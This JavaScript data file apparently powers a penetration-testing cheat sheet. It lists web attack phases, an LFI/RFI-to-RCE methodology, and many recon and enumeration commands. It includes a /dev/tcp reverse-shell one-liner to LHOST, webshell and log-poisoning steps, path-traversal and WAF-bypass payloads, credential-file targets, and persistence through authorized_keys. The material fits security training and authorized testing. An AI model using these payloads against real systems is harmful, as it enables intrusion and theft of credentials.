              itemLinks: { 0: { tacticId: 'footprinting', techId: 'fp-subdomain' }, 1: { tacticId: 'footprinting', techId: 'fp-dns' }, 2: { tacticId: 'recon', techId: 'recon-passive' }, 3: { tacticId: 'recon', techId: 'recon-passive' }, 4: { tacticId: 'recon', techId: 'recon-passive' }, 5: { tacticId: 'recon', techId: 'recon-web' } },
            },
            {
              icon: '🗺️',
              name: 'Scanning & Enumeration',
              description: 'Actively map directories, parameters, and endpoints. Identify WAF, CMS, and framework versions.',
              items: ['Directory Bruteforce', 'Parameter Discovery', 'Crawling & Spidering', 'WAF Detection', 'API Discovery', 'nuclei Scan'],
              itemLinks: { 0: { tacticId: 'recon', techId: 'recon-web' }, 1: { tacticId: 'recon', techId: 'recon-web' }, 2: { tacticId: 'recon', techId: 'recon-web' }, 3: { tacticId: 'recon', techId: 'recon-web' }, 4: { tacticId: 'recon', techId: 'recon-api' }, 5: { tacticId: 'web-recon' } },
            },
            {
              icon: '🔐',
              name: 'Authentication Testing',
              description: 'Test login mechanisms, session handling, tokens, and multi-factor authentication for bypasses and weaknesses.',
              items: ['Default Credentials', 'Brute Force Login', 'Password Spraying', 'JWT Attacks', 'OAuth Misconfig', 'Session Fixation', 'MFA Bypass'],
              itemLinks: { 0: { tacticId: 'web-auth' }, 1: { tacticId: 'web-auth' }, 2: { tacticId: 'web-auth' }, 3: { tacticId: 'web-auth' } },
            },
            {
              icon: '💉',
              name: 'Injection Testing',
              description: 'Test every input vector for injection vulnerabilities — SQL, XSS, SSTI, command injection, SSRF, and XXE.',
              items: ['SQL Injection', 'Cross-Site Scripting (XSS)', 'Server-Side Template Injection', 'Command Injection', 'SSRF', 'XXE', 'LDAP Injection'],
              itemLinks: { 0: { tacticId: 'web-sqli' }, 1: { tacticId: 'web-xss' }, 3: { tacticId: 'web-cmdi' }, 4: { tacticId: 'web-ssrf' }, 5: { tacticId: 'web-xxe' } },
            },
            {
              icon: '📁',
              name: 'File & Path Testing',
              description: 'Abuse file upload endpoints and path handling to achieve LFI, RFI, or remote code execution.',
              items: ['File Upload Bypass', 'Local File Inclusion (LFI)', 'Path Traversal', 'Remote File Inclusion (RFI)'],
              itemLinks: { 0: { tacticId: 'web-upload' }, 1: { tacticId: 'web-lfi' }, 2: { tacticId: 'web-lfi' }, 3: { tacticId: 'web-lfi' } },
            },
            {
              icon: '🔓',
              name: 'Access Control Testing',
              description: 'Test for IDOR, broken access control, privilege escalation, and client-side enforcement flaws.',
              items: ['IDOR / BAC', 'Horizontal Privilege Escalation', 'Vertical Privilege Escalation', 'CORS Misconfiguration', 'CSRF'],
              itemLinks: { 0: { tacticId: 'web-idor' }, 1: { tacticId: 'web-idor' }, 2: { tacticId: 'web-idor' } },
            },
            {
              icon: '🏆',
              name: 'Post Exploitation',
              description: 'Chain findings to demonstrate real-world impact — data exfiltration, pivoting to internal services, or persistent access.',
              items: ['Data Exfiltration via SQLi', 'Credential Harvesting', 'Internal Pivot via SSRF', 'RCE via File Upload', 'Reporting & PoC'],
              itemLinks: { 2: { tacticId: 'web-ssrf' }, 3: { tacticId: 'web-upload' } },
            },
          ],
          concepts: [
            { name: 'OWASP Top 10', description: 'The ten most critical web security risks: broken access control, cryptographic failures, injection, insecure design, security misconfiguration, vulnerable components, authentication failures, software integrity failures, logging failures, and SSRF.' },
            { name: 'Same-Origin Policy (SOP)', description: 'Browser security model preventing a page at origin A from reading responses from origin B. CORS headers explicitly relax SOP. Misconfigured CORS (Access-Control-Allow-Origin: *) can leak sensitive data to attacker-controlled pages.' },
            { name: 'JWT Attacks', description: 'JSON Web Tokens can be exploited via alg:none (remove signature), RS256→HS256 confusion (sign with public key), weak secrets (brute-force with hashcat), or kid parameter injection pointing to attacker-controlled key.' },
            { name: 'WAF Bypass', description: 'Web Application Firewalls block common payloads by signature matching. Bypass techniques: case variation (SeLeCt), comment injection (SEL/**/ECT), URL/double encoding (%27 → %2527), HTTP parameter pollution, chunked transfer encoding.' },
            { name: 'OAuth 2.0 Flows', description: 'OAuth misconfigurations include: open redirect in redirect_uri allowing token theft, state parameter missing enabling CSRF, implicit flow leaking tokens in URL fragments, and scope manipulation. Always test redirect_uri validation and PKCE enforcement.' },
            { name: 'Content Security Policy (CSP)', description: 'HTTP header restricting which resources a page can load. Weak CSPs (unsafe-inline, data:, wildcard sources) allow XSS. Test via report-uri or browser console errors. CSP bypass via JSONP endpoints, Angular CSP bypass, or allowed-host misuse.' },
          ],
          tools: [
            { name: 'Burp Suite', purpose: 'Intercepting proxy, active scanner, Repeater, Intruder, and extension platform — the core web app testing tool' },
            { name: 'ffuf', purpose: 'Fast web fuzzer — directories, parameters, vhosts, headers' },
            { name: 'feroxbuster', purpose: 'Recursive directory brute-forcer with auto-discovery' },
            { name: 'sqlmap', purpose: 'Automated SQL injection detection, fingerprinting, and data extraction' },
            { name: 'nuclei', purpose: 'Template-based scanner for CVEs, misconfigurations, and known vulnerabilities' },
            { name: 'whatweb', purpose: 'Technology fingerprinting — CMS, server, framework, and plugin detection' },
            { name: 'wafw00f', purpose: 'WAF detection and fingerprinting' },
            { name: 'arjun', purpose: 'Hidden GET/POST parameter discovery via wordlists and heuristics' },
            { name: 'nikto', purpose: 'Web server misconfiguration and vulnerability scanner' },
            { name: 'wfuzz', purpose: 'Fuzzer for parameters, cookies, headers, and authentication fields' },
            { name: 'amass', purpose: 'Subdomain enumeration and attack surface mapping via OSINT' },
            { name: 'httpx', purpose: 'Fast HTTP probing — title, status code, tech detection across many hosts' },
          ],
        },
      },

      /* ── LFI / RFI Methodology ───────────────────────────────────────── */
      {
        id: 'lfi-methodology',
        name: 'File Inclusion (LFI/RFI)',
        description: 'End-to-end LFI/RFI attack methodology — from parameter discovery to RCE.',
        tags: ['methodology', 'overview', 'lfi', 'web'],
        theory: {
          intro: 'File inclusion vulnerabilities occur when user-controlled input is passed to a function that loads a file (include(), require(), import). The attack chain is: find the vulnerable parameter → read sensitive files → escalate to RCE. Every step informs the next — php.ini tells you which wrappers work, the webroot tells you where uploaded files land, and log paths enable poisoning. LFI almost always has an RCE path; the goal is to find the lowest-resistance one.',
          phases: [
            {
              icon: '🔍',
              name: '1. Discovery',
              description: 'Identify the vulnerable file inclusion parameter before attempting any payload.',
              items: [
                'Identify PHP app (Server header, X-Powered-By, .php extension, error messages)',
                'Fuzz GET param names — burp-parameter-names.txt (language, page, file, path, module, template, view, doc)',
                'Test basic LFI immediately: ?language=/etc/passwd',
                'Note the server type (Apache/Nginx) and OS (Linux vs Windows paths)',
                'Check if parameter is POST-only (test both methods)',
              ],
              itemLinks: { 1: { tacticId: 'web-lfi', techId: 'lfi-auto' }, 2: { tacticId: 'web-lfi', techId: 'lfi-basics' } },
            },
            {
              icon: '📂',
              name: '2. LFI Exploitation — File Read',
              description: 'Confirm and expand LFI to read arbitrary files. Each bypass unlocks more attack surface.',
              items: [
                'Basic traversal: ../../../../etc/passwd',
                'If prefix is enforced: ./languages/../../../../etc/passwd',
                'Filter bypasses: ....// (double traverse), %2e%2e%2f (URL encode), ..../ repeated',
                'PHP filter — read source without executing: php://filter/read=convert.base64-encode/resource=config',
                'Fuzz payloads with LFI-Jhaddix.txt if manual bypasses fail',
                'Second-order LFI: inject path into a stored field, trigger inclusion later',
              ],
              itemLinks: { 0: { tacticId: 'web-lfi', techId: 'lfi-basics' }, 1: { tacticId: 'web-lfi', techId: 'lfi-basics' }, 2: { tacticId: 'web-lfi', techId: 'lfi-bypass' }, 3: { tacticId: 'web-lfi', techId: 'lfi-source' }, 4: { tacticId: 'web-lfi', techId: 'lfi-auto' }, 5: { tacticId: 'web-lfi', techId: 'lfi-bypass' } },
            },
            {
              icon: '🗂️',
              name: '3. Intel Gathering via LFI',
              description: 'Read high-value files to build the picture needed for RCE escalation.',
              items: [
                '/etc/passwd — valid usernames, home dirs, shell types',
                'Web app configs: config.php, .env, wp-config.php, database.php — credentials',
                '/home/USER/.ssh/id_rsa — SSH private key (try all users from /etc/passwd)',
                'php.ini — check allow_url_include (RFI/wrappers), open_basedir, disable_functions',
                '/etc/apache2/apache2.conf + envvars — webroot path, log paths (APACHE_LOG_DIR)',
                '/proc/self/environ — process env vars including HTTP headers',
                'Session files: /var/lib/php/sessions/sess_PHPSESSID — confirm session param name',
              ],
              itemLinks: { 0: { tacticId: 'web-lfi', techId: 'lfi-basics' }, 2: { tacticId: 'web-lfi', techId: 'lfi-basics' }, 3: { tacticId: 'web-lfi', techId: 'lfi-rce' }, 4: { tacticId: 'web-lfi', techId: 'lfi-auto' }, 5: { tacticId: 'web-lfi', techId: 'lfi-rce' }, 6: { tacticId: 'web-lfi', techId: 'lfi-rce' } },
            },
            {
              icon: '💥',
              name: '4. Escalate to RCE — Choose the Path',
              description: 'Select the RCE path based on what the intel phase revealed. Work top-to-bottom — most reliable first.',
              items: [
                '① File Upload exists → Malicious GIF (GIF8<?php...?>) → include via LFI [always try first]',
                '② File Upload + zip:// or phar:// available → zip/phar webshell renamed as .jpg',
                '③ allow_url_include=On → PHP wrappers: data:// (base64 webshell) or php://input (POST body)',
                '④ allow_url_include=On → RFI via HTTP (python3 -m http.server), FTP (pyftpdlib), or SMB (Windows)',
                '⑤ Log files readable → poison User-Agent in access.log, then include',
                '⑥ PHPSESSID accessible → PHP session poisoning (URL-encode webshell into language param)',
                '⑦ /proc/self/environ or /proc/self/fd/N readable → poison User-Agent, include via /proc',
                '⑧ SSH/FTP/mail accessible → poison auth.log / vsftpd.log / mail via invalid username',
              ],
              itemLinks: {
                0: { tacticId: 'web-lfi', techId: 'lfi-rce' },
                1: { tacticId: 'web-lfi', techId: 'lfi-rce' },
                2: { tacticId: 'web-lfi', techId: 'lfi-rce' },
                3: { tacticId: 'web-lfi', techId: 'lfi-rce' },
                4: { tacticId: 'web-lfi', techId: 'lfi-rce' },
                5: { tacticId: 'web-lfi', techId: 'lfi-rce' },
                6: { tacticId: 'web-lfi', techId: 'lfi-rce' },
                7: { tacticId: 'web-lfi', techId: 'lfi-rce' },
              },
            },
            {
              icon: '🚀',
              name: '5. Post-RCE',
              description: 'Upgrade and leverage the shell. Read shadow, escalate, persist.',
              items: [
                'Upgrade webshell to reverse shell: bash -c "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"',
                'Read /etc/shadow — crack hashes with hashcat',
                'Check sudo -l and SUID binaries (find / -perm -4000)',
                'Read /root/.ssh/id_rsa or drop authorized_keys for persistence',
                'Pivot via internal services found in /proc/self/net/tcp or apache configs',
              ],
            },
            {
              icon: '🔬',
              name: '6. Automate & Report',
              description: 'Cover residual attack surface with fuzzing, document findings.',
              items: [
                'Fuzz webroot path (default-web-root-directory-linux.txt) for relative path construction',
                'Fuzz server logs & configs (LFI-WordList-Linux) — 60+ hits vs Jhaddix\'s ~10',
                'Confirm CVSSv3 score: LFI alone = High (file read), LFI→RCE = Critical',
                'Document chain: parameter → bypass → file read → RCE path with PoC curl commands',
              ],
              itemLinks: { 0: { tacticId: 'web-lfi', techId: 'lfi-auto' }, 1: { tacticId: 'web-lfi', techId: 'lfi-auto' } },
            },
          ],
          concepts: [
            {
              name: 'include() vs file_get_contents()',
              description: 'include() / require() execute any PHP in the loaded file — critical for RCE. file_get_contents() and fopen() only read — you get file disclosure but not code execution. The vulnerability class (LFI vs file read) depends on which function is used.',
              items: ['include(), include_once(), require(), require_once() → Execute + Remote URL (with allow_url_include)', 'file_get_contents(), fopen(), file() → Read only, no execution', 'res.render() (NodeJS), import (Java), include (.NET) → Vary — check Remote URL column'],
            },
            {
              name: 'allow_url_include',
              description: 'PHP setting that enables including remote URLs and activates the data://, php://input, and php://filter wrappers for execution. Off by default since PHP 5.3. Always check this first — it gates the most powerful RCE paths.',
              flow: ['Read php.ini via php://filter base64', 'Decode and grep for allow_url_include', 'On → RFI + data:// + php://input available', 'Off → must use log poisoning, file upload, or phar://'],
            },
            {
              name: 'PHP Wrappers for LFI',
              description: 'PHP stream wrappers are URI schemes that modify how a file is loaded. Pentesters use them to read source (php://filter), achieve RCE (data://, php://input, expect://), or archive bypass (zip://, phar://).',
              items: ['php://filter — read base64-encoded PHP source without executing', 'data:// — embed PHP code inline (needs allow_url_include=On)', 'php://input — read POST body as PHP (needs allow_url_include=On)', 'expect:// — execute shell command directly (external, rarely installed)', 'zip:// — include file inside zip archive (zip://archive.zip#file.php)', 'phar:// — include file inside phar archive'],
            },
            {
              name: 'Log Poisoning Chain',
              description: 'Any log file that records user-controlled data (User-Agent, username, referer) and is readable via LFI can be turned into RCE. The pattern: write PHP into a log field → include the log file → PHP executes.',
              flow: ['Identify readable log (access.log, auth.log, vsftpd.log, mail, session)', 'Poison field with PHP webshell (curl -A or ssh with PHP username)', 'Include log via LFI: ?language=/var/log/apache2/access.log', 'Pass &cmd=id to execute — repeat poison before each new command if session-based'],
            },
            {
              name: 'Path Traversal Bypass Map',
              description: 'Filters that block ../ can often be defeated with encoding or doubling tricks. Always try the simplest bypass first before reaching for automation.',
              items: ['Basic: ../../../../etc/passwd', 'Double traverse: ....//....//etc/passwd (filter removes ../ leaving ../)', 'URL encode: %2e%2e%2f%2e%2e%2fetc%2fpasswd', 'Double URL encode: %252e%252e%252f (server decodes twice)', 'Path truncation (obsolete PHP<5.3): 2048+ chars + .ext overflows buffer', 'Null byte (obsolete PHP<5.4): /etc/passwd%00 strips appended extension'],
            },
            {
              name: 'RCE Path Decision Tree',
              description: 'Use intel gathered via LFI to pick the fastest RCE path. Not all paths are available on every target.',
              items: ['File upload endpoint? → GIF magic bytes (most reliable, no php.ini requirement)', 'allow_url_include=On? → data:// or php://input (instant, no upload needed)', 'Log readable? → poison access.log via User-Agent (always available on Apache/Nginx)', 'PHPSESSID exposed? → session poisoning (no file upload, no allow_url_include needed)', 'Windows target? → SMB RFI (no allow_url_include needed, UNC path native)'],
            },
          ],
          tools: [
            { name: 'ffuf', purpose: 'Parameter fuzzing (burp-parameter-names.txt), LFI payload fuzzing (LFI-Jhaddix.txt), webroot and log path discovery' },
            { name: 'Burp Suite', purpose: 'Intercept requests to test LFI params, modify User-Agent for log poisoning, use Repeater for iterative payload testing' },
            { name: 'curl', purpose: 'Test LFI payloads, poison log files via -A (User-Agent) or -H @file, send php://input POST bodies, host-free RCE testing' },
            { name: 'python3 -m http.server', purpose: 'Host PHP webshell for RFI via HTTP. Use port 443/80 to bypass egress firewall rules' },
            { name: 'pyftpdlib', purpose: 'Host webshell via FTP for RFI when http:// is blocked by WAF (pip install pyftpdlib; python -m pyftpdlib -p 21)' },
            { name: 'impacket-smbserver', purpose: 'Host SMB share for RFI on Windows targets — no allow_url_include required, UNC path native' },
            { name: 'php', purpose: 'Compile phar archives locally (php --define phar.readonly=0 shell.php) for the phar:// upload RCE path' },
          ],
        },
        subtechniques: [],
      },
    ],
  },

  /* ── 1. Reconnaissance ──────────────────────────────────────────────────── */
  {
    id: 'recon',
    name: 'Reconnaissance',
    icon: '🔍',
    techniques: [
      {
        id: 'recon-portscan',
        name: 'Port Scan',
        description: 'Discover open ports and services on the target.',
        tags: ['nmap', 'external'],
        commands: [
          { id: 'r1', label: 'Quick top-1000 scan', os: 'Linux', command: 'nmap -sV -sC -T4 $$IP', notes: '' },
          { id: 'r2', label: 'Full port scan', os: 'Linux', command: 'nmap -p- -T4 --min-rate 5000 $$IP', notes: 'Follow up with -sV on found ports.' },
          { id: 'r3', label: 'UDP top-20', os: 'Linux', command: 'nmap -sU --top-ports 20 $$IP', notes: 'Requires root.' },
          { id: 'r4', label: 'Vuln scripts', os: 'Linux', command: 'nmap --script=vuln -p 80,443,445 $$IP', notes: 'Noisy — use with care.' },
        ],
      },
      {
        id: 'recon-web',
        name: 'Web Enumeration',
        description: 'Discover web endpoints, fingerprint technologies, enumerate virtual hosts, and crawl web applications.',
        tags: ['web', 'http'],
        subtechniques: [
          {
            id: 'rweb-dir',
            name: 'Directory & File Brute Force',
            commands: [
            { id: 'web1', label: 'ffuf dir brute', os: 'Linux', command: 'ffuf -w $$WORDLIST -u $$URL/FUZZ', notes: '' },
            { id: 'rweb1', label: 'ffuf file fuzzing', os: 'Linux', command: 'ffuf -w $$WORDLIST -u $$URL/FUZZ -e .php,.html,.txt,.bak,.js -v -mc 200,301', notes: 'Appends each extension to every wordlist entry. -v shows full URL per match.' },
            { id: 'rweb1b', label: 'ffuf recursive', os: 'Linux', command: 'ffuf -w $$WORDLIST -u $$URL/FUZZ -e .html -recursion -recursion-depth 2 -rate 500 -t 100 -v', notes: '-recursion auto-dives into discovered directories. -rate 500 caps requests/sec to avoid overwhelming the server.' },
            { id: 'rweb2', label: 'gobuster dir', os: 'Linux', command: 'gobuster dir -u $$URL -w $$WORDLIST -x php,html,txt -t 50 -b 404', notes: '-b excludes status codes. -s includes only specified codes. --exclude-length skips responses of a given byte size.' },
            { id: 'rweb2b', label: 'gobuster (exclude length)', os: 'Linux', command: 'gobuster dir -u $$URL -w $$WORDLIST --exclude-length 0 -t 50', notes: 'Skips empty-body responses — useful when the server returns 200 for all paths.' },
            { id: 'rweb3', label: 'feroxbuster recursive', os: 'Linux', command: 'feroxbuster -u $$URL -w $$WORDLIST -x php,html,txt --depth 3', notes: 'Auto-recursive scanner. Follows every discovered directory automatically.' },
            { id: 'rweb3b', label: 'feroxbuster filtered', os: 'Linux', command: 'feroxbuster -u $$URL -w $$WORDLIST -C 404,500 -S 1024 --dont-scan /uploads', notes: '-C filters by status code, -S filters by response size (bytes), --dont-scan skips known noise paths.' },
            { id: 'rweb3c', label: 'wenum dir fuzz', os: 'Linux', command: 'wenum -w $$WORDLIST --hc 404 -u "$$URL/FUZZ"', notes: 'wfuzz successor. --hc hides matching codes; --sc shows only matching; --hs hides by size; --hw hides by word count.' },
            ]
          },
          {
            id: 'rweb-param',
            name: 'Parameter Fuzzing',
            commands: [
            { id: 'rweb-p1', label: 'GET param discovery (ffuf)', os: 'Linux', command: 'ffuf -w $$WORDLIST -u "$$URL/page.php?FUZZ=test" -mc 200 -fw 219', notes: 'Replace 219 with the word count from the baseline response to filter false positives. Use -fc 404 or -fs <size> alternatively.' },
            { id: 'rweb-p2', label: 'GET param value fuzz (ffuf)', os: 'Linux', command: 'ffuf -w $$WORDLIST -u "$$URL/page.php?param=FUZZ" -mc 200', notes: 'Once parameter name is known, fuzz its value for injection or bypass.' },
            { id: 'rweb-p3', label: 'GET param fuzz (wenum)', os: 'Linux', command: 'wenum -w $$WORDLIST --hc 404 -u "http://$$IP:$$PORT/get.php?x=FUZZ"', notes: 'wenum (wfuzz successor) — --hc hides unwanted codes, --sc shows only matching, --hw filters by word count.' },
            { id: 'rweb-p4', label: 'Probe POST params (curl)', os: 'Linux', command: 'curl -d "" http://$$IP:$$PORT/post.php', notes: 'Empty POST body — server error often reveals the expected parameter name in the response.' },
            { id: 'rweb-p5', label: 'POST param value fuzz (ffuf)', os: 'Linux', command: 'ffuf -u $$URL/post.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "param=FUZZ" -w $$WORDLIST -mc 200 -v', notes: 'Replace "param" with the discovered parameter name. -mc 200 matches only successful responses.' },
            { id: 'rweb-p6', label: 'Verify POST param (curl)', os: 'Linux', command: 'curl -d "param=VALUE" http://$$IP:$$PORT/post.php', notes: 'Confirm the found param value works before moving to exploitation.' },
            ]
          },
          {
            id: 'rweb-vhost',
            name: 'VHost Enumeration',
            commands: [
            { id: 'web2', label: 'ffuf vhost fuzz', os: 'Linux', command: 'ffuf -u $$URL -H "Host: FUZZ.$$DOMAIN" -w $$WORDLIST -fs 0', notes: 'Fuzz virtual hosts via Host header manipulation. Use -fs to filter out the default page size.' },
            { id: 'rweb4', label: 'gobuster vhost', os: 'Linux', command: 'gobuster vhost -u $$URL -w $$WORDLIST --append-domain --domain $$DOMAIN', notes: '--append-domain appends the domain suffix to each wordlist entry (e.g. dev → dev.example.com).' },
            ]
          },
          {
            id: 'rweb-fp',
            name: 'Fingerprinting',
            commands: [
            { id: 'rweb5', label: 'Banner grab (curl)', os: 'Linux', command: 'curl -I $$URL', notes: 'Check Server, X-Powered-By, Set-Cookie, and other disclosure headers. Try both http:// and www. variants.' },
            { id: 'web4', label: 'whatweb', os: 'Linux', command: 'whatweb $$URL', notes: 'Identify CMS, frameworks, server version, and JavaScript libraries.' },
            { id: 'rweb6', label: 'WAF detection (wafw00f)', os: 'Linux', command: 'wafw00f $$URL', notes: 'Detect and fingerprint Web Application Firewalls — affects payloads and evasion strategy.' },
            { id: 'web3', label: 'nikto scan', os: 'Linux', command: 'nikto -h $$URL', notes: 'Noisy but thorough — checks for misconfigs, default files, and known vulnerabilities.' },
            { id: 'rweb7', label: 'nikto software id', os: 'Linux', command: 'nikto -h $$URL -Tuning b', notes: 'Tuning b limits scan to software identification only — less noisy.' },
            { id: 'rweb8', label: 'robots.txt', os: 'Linux', command: 'curl -s $$URL/robots.txt', notes: 'Disallowed paths often point to admin panels or sensitive directories.' },
            { id: 'rweb9', label: 'sitemap.xml', os: 'Linux', command: 'curl -s $$URL/sitemap.xml', notes: 'Full index of crawlable pages — useful for coverage mapping.' },
            { id: 'rweb10', label: 'security.txt (well-known)', os: 'Linux', command: 'curl -s $$URL/.well-known/security.txt', notes: 'Vulnerability disclosure policy. May also reveal bug bounty scope or contacts.' },
            ]
          },
          {
            id: 'rweb-crawl',
            name: 'Web Crawling',
            commands: [
            { id: 'rweb11', label: 'ReconSpider crawl', os: 'Linux', command: 'python3 ReconSpider.py $$URL', notes: 'Output saved to results.json. Extracts links, emails, IP addresses, and interesting paths from page source.' },
            { id: 'rweb12', label: 'wget mirror (offline)', os: 'Linux', command: 'wget --mirror --convert-links --adjust-extension --page-requisites --no-parent $$URL', notes: 'Download full site for offline analysis. Useful on slow or unreliable connections.' },
            { id: 'rweb12b', label: 'hakrawler crawl', os: 'Linux', command: 'echo $$URL | hakrawler -d 3 -subs -u', notes: '-d sets crawl depth, -subs includes subdomains, -u deduplicates URLs. Pipe to grep for targeted filtering.' },
            { id: 'rweb12c', label: 'katana crawl', os: 'Linux', command: 'katana -u $$URL -d 3 -jc -kf all -o katana_out.txt', notes: '-jc parses JavaScript for endpoints, -kf all extracts known files. Fast Projectdiscovery crawler.' },
            ]
          },
          {
            id: 'rweb-ssl',
            name: 'SSL / TLS Analysis',
            commands: [
            { id: 'rweb-s1', label: 'testssl.sh full check', os: 'Linux', command: 'testssl.sh $$DOMAIN', notes: 'Checks all SSL/TLS versions, ciphers, certificate info, and vulnerabilities (POODLE, Heartbleed, BEAST, ROBOT, etc.).' },
            { id: 'rweb-s2', label: 'testssl.sh save report', os: 'Linux', command: 'testssl.sh --jsonfile results.json --htmlfile results.html $$DOMAIN', notes: 'Output full report in JSON and HTML.' },
            { id: 'rweb-s3', label: 'sslscan', os: 'Linux', command: 'sslscan $$DOMAIN', notes: 'Enumerates supported TLS versions, cipher suites, and certificate details. Faster than testssl for quick checks.' },
            { id: 'rweb-s4', label: 'sslyze', os: 'Linux', command: 'sslyze $$DOMAIN --regular', notes: '--regular runs certificate, cipher, protocol, and renegotiation checks.' },
            { id: 'rweb-s5', label: 'nmap SSL scripts', os: 'Linux', command: 'nmap -sV --script ssl-enum-ciphers,ssl-cert,ssl-poodle,ssl-heartbleed -p 443 $$IP', notes: 'Quick SSL audit via Nmap NSE scripts.' },
            { id: 'rweb-s6', label: 'Cert info (openssl)', os: 'Linux', command: 'openssl s_client -connect $$DOMAIN:443 </dev/null | openssl x509 -noout -text', notes: 'Prints full certificate: issuer, expiry, SANs, key size. SANs often reveal internal hostnames.' },
            ]
          },
          {
            id: 'rweb-cms',
            name: 'CMS Enumeration',
            commands: [
            { id: 'rweb-c1', label: 'WordPress (wpscan)', os: 'Linux', command: 'wpscan --url $$URL --enumerate p,t,u --plugins-detection aggressive', notes: '-e p = plugins, t = themes, u = users. Requires WordPress to be installed.' },
            { id: 'rweb-c2', label: 'WordPress user enum', os: 'Linux', command: 'wpscan --url $$URL --enumerate u', notes: 'Enumerate users via author archives. Combine with password attack: --password-attack xmlrpc.' },
            { id: 'rweb-c3', label: 'WordPress vuln scan', os: 'Linux', command: 'wpscan --url $$URL --api-token YOUR_TOKEN --enumerate vp', notes: 'vp = vulnerable plugins. Free API token from wpscan.com gives 25 daily API calls.' },
            { id: 'rweb-c4', label: 'Joomla (joomscan)', os: 'Linux', command: 'joomscan --url $$URL', notes: 'Identifies Joomla version, installed components, and known CVEs.' },
            { id: 'rweb-c5', label: 'Drupal (droopescan)', os: 'Linux', command: 'droopescan scan drupal -u $$URL', notes: 'Detects Drupal version, plugins, and themes. Also supports: silverstripe, wordpress, joomla, moodle.' },
            { id: 'rweb-c6', label: 'CMSeeK', os: 'Linux', command: 'python3 cmseek.py -u $$URL', notes: 'Auto-detects CMS type (WordPress, Joomla, Drupal, Laravel, etc.) and runs appropriate scan.' },
            { id: 'rweb-c7', label: 'Manual version (readme)', os: 'Linux', command: 'curl -s $$URL/README.txt && curl -s $$URL/CHANGELOG.txt && curl -s $$URL/wp-login.php', notes: 'WordPress: /readme.html or /readme.txt often shows exact version. Joomla: /administrator/manifests/files/joomla.xml.' },
            ]
          },
          {
            id: 'rweb-js',
            name: 'JavaScript Analysis',
            commands: [
            { id: 'rweb-j1', label: 'Collect all JS files (getJS)', os: 'Linux', command: 'getJS --url $$URL --output js_files.txt', notes: 'Fetches all JS file URLs from a page. Pipe into curl or wget for download.' },
            { id: 'rweb-j2', label: 'Extract JS endpoints (LinkFinder)', os: 'Linux', command: 'python3 LinkFinder.py -i $$URL -d -o results.html', notes: '-d crawls for JS files automatically. Extracts API endpoints, internal paths, and relative URLs from JS.' },
            { id: 'rweb-j3', label: 'Find secrets in JS (SecretFinder)', os: 'Linux', command: 'python3 SecretFinder.py -i $$URL/app.js -o cli', notes: 'Regex-based scanner for API keys, tokens, AWS credentials, and other secrets in JavaScript files.' },
            { id: 'rweb-j4', label: 'Mine URLs from JS (gau)', os: 'Linux', command: 'gau --providers wayback,otx,commoncrawl $$DOMAIN | grep "\\.js" | sort -u', notes: 'Get All URLs — pulls from Wayback, OTX, and CommonCrawl. Filter for JS files to prioritize.' },
            { id: 'rweb-j5', label: 'Grep JS for secrets', os: 'Linux', command: 'curl -s $$URL/app.js | grep -Ei "(api[_-]?key|token|secret|password|auth|bearer|private|credential)" ', notes: 'Quick manual check for hardcoded secrets. Also look for internal IP addresses and dev endpoints.' },
            { id: 'rweb-j6', label: 'Beautify minified JS', os: 'Linux', command: 'curl -s $$URL/app.min.js | js-beautify -o app_readable.js', notes: 'Minified JS is unreadable — beautify before grepping or manual review.' },
            ]
          },
          {
            id: 'rweb-expose',
            name: 'Source Code Exposure',
            commands: [
            { id: 'rweb-e1', label: '.git directory exposed', os: 'Linux', command: 'curl -s $$URL/.git/HEAD', notes: 'Response "ref: refs/heads/main" confirms .git is exposed. Dump entire repo with git-dumper.' },
            { id: 'rweb-e2', label: 'git-dumper (full repo)', os: 'Linux', command: 'git-dumper $$URL/.git ./dumped_repo', notes: 'Reconstructs the full git repository from an exposed .git directory. Install: pip install git-dumper.' },
            { id: 'rweb-e3', label: '.env file exposed', os: 'Linux', command: 'curl -s $$URL/.env', notes: 'Often contains database credentials, API keys, and APP_KEY. A single hit here can compromise the entire app.' },
            { id: 'rweb-e4', label: 'Backup file brute (ffuf)', os: 'Linux', command: 'ffuf -u $$URL/FUZZ -w $$WORDLIST -e .bak,.old,.orig,.backup,.zip,.tar.gz,.sql -mc 200', notes: 'Hunt for forgotten backup files. Common finds: index.php.bak, config.php.old, db.sql.' },
            { id: 'rweb-e5', label: 'Config file exposure', os: 'Linux', command: 'curl -s $$URL/config.php && curl -s $$URL/wp-config.php && curl -s $$URL/config.yml', notes: 'Common config file paths across frameworks. Source code typically not returned — look for 200 vs 404.' },
            { id: 'rweb-e6', label: '.svn exposure', os: 'Linux', command: 'curl -s $$URL/.svn/entries', notes: 'SVN equivalent of .git. If exposed, use svn-extractor to dump the full working copy.' },
            { id: 'rweb-e7', label: 'Docker/compose exposure', os: 'Linux', command: 'curl -s $$URL/Dockerfile && curl -s $$URL/docker-compose.yml', notes: 'Reveals base images, env vars, ports, and internal service names. Common in misconfigured dev boxes.' },
            { id: 'rweb-e8', label: '.DS_Store exposure', os: 'Linux', command: 'curl -s $$URL/.DS_Store | xxd | head', notes: 'macOS metadata file — contains directory structure listing. Parse with ds-store-parser to enumerate hidden paths.' },
            ]
          },
          {
            id: 'rweb-http',
            name: 'HTTP Headers & Methods',
            commands: [
            { id: 'rweb-h1', label: 'Allowed methods (OPTIONS)', os: 'Linux', command: 'curl -I -X OPTIONS $$URL', notes: 'Check the Allow response header for unexpected methods (PUT, DELETE, TRACE, PATCH).' },
            { id: 'rweb-h2', label: 'TRACE method test', os: 'Linux', command: 'curl -X TRACE $$URL -v', notes: 'TRACE enabled = XST (Cross-Site Tracing) vulnerability. Should always be disabled.' },
            { id: 'rweb-h3', label: 'CORS misconfiguration', os: 'Linux', command: 'curl -I -H "Origin: https://evil.com" $$URL', notes: 'Check Access-Control-Allow-Origin in response. If it reflects evil.com → CORS misconfiguration.' },
            { id: 'rweb-h4', label: 'Security headers audit', os: 'Linux', command: 'curl -I $$URL | grep -iE "(x-frame|content-security|strict-transport|x-content-type|referrer-policy|permissions-policy)"', notes: 'Missing headers = findings: no CSP, no HSTS, no X-Frame-Options, no X-Content-Type-Options.' },
            { id: 'rweb-h5', label: 'Cookie flags check', os: 'Linux', command: 'curl -I $$URL | grep -i "set-cookie"', notes: 'Look for missing Secure, HttpOnly, and SameSite flags on session cookies.' },
            { id: 'rweb-h6', label: 'CSP header full view', os: 'Linux', command: 'curl -sI $$URL | grep -i "content-security-policy"', notes: 'Weak CSP (unsafe-inline, unsafe-eval, wildcard *) allows XSS. Also check for report-uri endpoints.' },
